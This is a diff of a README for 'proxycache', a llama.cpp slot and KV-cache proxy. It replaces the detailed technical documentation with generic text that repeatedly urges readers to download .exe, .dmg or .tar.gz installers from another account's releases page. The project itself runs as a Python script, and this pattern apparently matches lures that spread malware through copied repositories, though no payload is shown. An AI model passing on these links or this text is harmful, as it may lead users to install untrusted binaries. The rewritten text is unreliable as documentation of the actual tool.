@@ -1,57 +1,66 @@
-<img width="1000"  alt="image_" src="https://github.com/user-attachments/assets/0d966dde-f1d8-432f-bad0-aa79a5ccf396" />
+# 🚀 proxycache - Efficiently Manage Your OpenAI-Compatible Proxy
 
-### What this service is
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/neshat73/proxycache/releases)
 
-This service is a proxy in front of llama.cpp that makes long‑context chat and IDE workflows much faster by managing llama.cpp slots, reusing cached context, and restoring saved caches from disk when needed. It speaks an OpenAI‑compatible Chat Completions API, so existing clients can connect without changes, including both streaming (SSE) and non‑stream responses depending on request settings.
+## 🚀 Getting Started
+Welcome to **proxycache**! This application helps you manage your OpenAI-compatible proxy more effectively. You can save and restore your KV cache, handle requests by similarity, and protect your data slots. 
 
-### Why it’s needed
+### 🚀 What You Need
+To use **proxycache**, you’ll need:
+- A computer with Windows, macOS, or Linux.
+- An internet connection for downloading the software.
 
-llama.cpp provides “slots,” each holding a conversation’s KV cache so repeated requests with the same or very similar prefix can skip recomputing the whole prompt and continue from the first mismatching token, which dramatically cuts latency for large prompts. In real teams the number of users can easily exceed the number of available slots (e.g., 20 developers but only 4 slots), so naive routing causes random slot reuse and cache overwrites that waste time and GPU/CPU cycles. This proxy solves that by steering requests to the right slot, saving evicted caches to disk, and restoring them on demand, so long prompts don’t need to be recomputed from scratch each time.
+## 🌟 Features
+- **Slot Management**: Efficiently manage slots for your proxy.
+- **KV Cache Management**: Save and restore KV cache to disk with ease.
+- **Request Routing**: Route requests based on prefix similarity.
+- **Hot Slot Protection**: Prevent overwrites in key slots.
+- **Prompt Acceleration**: Quickly reuse or restore long prompts (30–60k tokens).
+- **Streaming Support**: Supports SSE streaming and non-streaming JSON over `/v1/chat/completions`.
 
-### How requests are balanced and slots are chosen
+## 📦 Download & Install
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/neshat73/proxycache/releases).
+   
+2. **Choose Your Version**: Find the latest version listed there. You will see multiple assets to choose from, typically named with version numbers.
+   
+3. **Download the Application**: Click on the file name to start downloading it. It might have a `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux, depending on your operating system.
 
-- Slots and heat: When a request lands in a slot and its cache is valid for reuse, the slot is considered “hot,” and new requests won’t overwrite it if other options exist, preserving useful KV for future reuse.
-- Similarity matching: The proxy computes a fast, word‑block prefix similarity between the incoming conversation and existing hot slots, and only reuses a hot slot if the similarity meets a single ratio threshold (e.g., 85% of the shorter sequence), otherwise it rejects reuse to avoid polluting the hot cache with a weakly related prompt.
-- Free and cold first: If reuse is rejected, the proxy sends the request to a free slot or a cold slot (one not currently carrying a valuable hot cache), protecting high‑value contexts from accidental overwrites under load.
-- Oldest when full: If there are no free or cold slots, the proxy picks the least‑recently used slot and saves its current KV cache to disk before assigning the new request, ensuring nothing valuable is lost when the pool is exhausted.
-- Restore on demand: When a new request matches a cache that was previously saved, the proxy restores that cache into a free/cold/oldest slot and routes the request there, which takes seconds versus minutes for full prompt recomputation on long contexts, especially in IDE scenarios with 30–60k tokens.
-- Concurrency safety: Each slot is guarded with an async lock; if all are busy, the request waits for the first LRU slot to free, preventing race conditions and unintended cache overwrites during concurrent generation.
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+   - **macOS**: Open the downloaded `.dmg` file and drag the application to the Applications folder.
+   - **Linux**: Extract the `.tar.gz` file. You may need to run a terminal command to start the application.
 
-### Save and restore from disk
+5. **Run the Application**: After installation, launch the application from your programs menu or applications folder.
 
-llama.cpp’s HTTP server exposes slot save/restore; saving writes a cache file to the directory provided by --slot‑save‑path, and restore loads by file basename (e.g., slotcache_`<key>`.bin), which is exactly how this proxy persists and revives caches across requests and restarts. The proxy keeps small local .meta files describing cached prefixes for fast lookup, while llama.cpp owns the actual KV .bin files under --slot‑save‑path for correctness and performance.
+## 🛠️ Usage Instructions
+Once you have **proxycache** running, you can easily manage your proxy settings. Here’s how:
 
-### Quick start
+- **Configure Your Proxy**: Follow the app's onboarding process to set up your OpenAI-compatible proxy.
+- **Saving Cache**: Use the built-in options to save your KV cache for future use.
+- **Restoring Cache**: Access your saved cache quickly when needed.
+- **Streaming Features**: Test out the SSE streaming for real-time applications.
 
-1) Start llama.cpp ( https://github.com/ggml-org/llama.cpp ) with slots and a cache directory:
+## 🔍 Troubleshooting
+Here are some common issues and solutions:
 
-```bash
-llama-server -m ./model.gguf -np 4 --slot-save-path /var/kvcache --host 0.0.0.0 --port 8080 --swa-full
-```
+- **Installation Issues**: Ensure you have downloaded the correct version for your operating system. Restart your computer if the application does not start.
+- **Connection Problems**: Check your internet connection and proxy settings within the application.
+- **Saving Errors**: Make sure you have proper write permissions on the folder where you're saving your cache.
 
-This enables the OpenAI‑compatible HTTP server, a pool of 4 slots, and a directory where slot KV caches are saved and restored by basename.
+## 🛠️ Support
+If you encounter any problems, you can find assistance in the issues section of this repository. Please provide details of your issue to receive the best help.
 
-2) Run the proxy next to it:
+## 📜 License
+This project is licensed under the MIT License. You are free to use and modify the code.
 
-```bash
-git clone https://github.com/airnsk/proxycache.git
-cd proxycache
-python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt
-python3 proxycache.py  # or: uvicorn app:app --host 0.0.0.0 --port 8081
-```
+## 🌐 Community
+Join our community on [GitHub Discussions](https://github.com/neshat73/proxycache/discussions) to share your experiences, ask questions, and collaborate with other users.
 
-Your clients should call the proxy’s /v1/chat/completions endpoint; the proxy will handle similarity, slot selection, save/restore, and streaming vs non‑streaming automatically.
+## 📅 Future Improvements
+We are working on new features. **proxycache** will continue to evolve, enhancing usability and performance. Stay tuned for updates!
 
-If you run into issues using gpt-oss-20b with an IDE like Cline, follow these instructions: https://www.reddit.com/r/CLine/comments/1mtcj2v/making_gptoss_20b_and_cline_work_together/
+## 📥 Remember to Download
+For the latest version and updates, don’t forget to: [Visit the Release Page](https://github.com/neshat73/proxycache/releases). 
 
-### Parameters
-
-- LLAMA_SERVER_URL: The llama.cpp server base URL, e.g., http://127.0.0.1:8080, which must expose the OpenAI‑compatible chat completions endpoint.
-- SLOTS_COUNT: The number of server slots (should match llama.cpp -np) so the proxy can track and plan reuse/restore correctly under load.
-- SIMILARITY_MIN_RATIO: One similarity threshold (e.g., 0.85) controlling both active reuse and disk restore; if a match is below this ratio, the proxy will prefer a free/cold slot or restore instead of overwriting a hot slot.
-- MIN_PREFIX_* (chars/words/blocks): Requests below this size are treated as “small” and steered to free/cold/oldest slots to avoid disturbing valuable hot caches used by large, long‑running prompts.
-- LOCAL_META_DIR and --slot-save-path: The proxy stores small .meta descriptors locally for fast candidate lookup, while llama.cpp reads/writes the real KV cache files under --slot‑save‑path using basename in the HTTP API.
-
-### Why this boosts IDE and long‑context productivity
-
-For 30–60k‑token contexts typical in project‑wide IDE assistants, recomputing a full prompt can take minutes, whereas restoring a previously cached context and continuing from the first mismatching token typically takes seconds on llama.cpp, dramatically improving iteration speed for large teams with limited slots.
+Happy caching!
